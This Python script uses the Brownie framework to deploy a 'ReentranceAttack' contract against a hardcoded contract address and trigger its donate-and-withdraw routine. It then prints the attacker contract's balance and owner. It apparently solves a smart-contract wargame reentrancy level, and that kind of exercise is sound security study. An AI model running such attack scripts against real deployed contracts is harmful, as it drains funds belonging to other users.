from brownie import network, accounts, ReentranceAttack


def main():
    network.gas_limit()
    acct = accounts.load("deploy")

    labingi = ReentranceAttack.deploy(
        "0x953Ae5FA4F5723b4c62282AD0Ca1Ef4B266BD696", {"from": acct})

    labingi.donateAndWithdraw({"from": accounts[0], "value": 100000000000000})

    print(labingi.balance())
    print(labingi.owner())
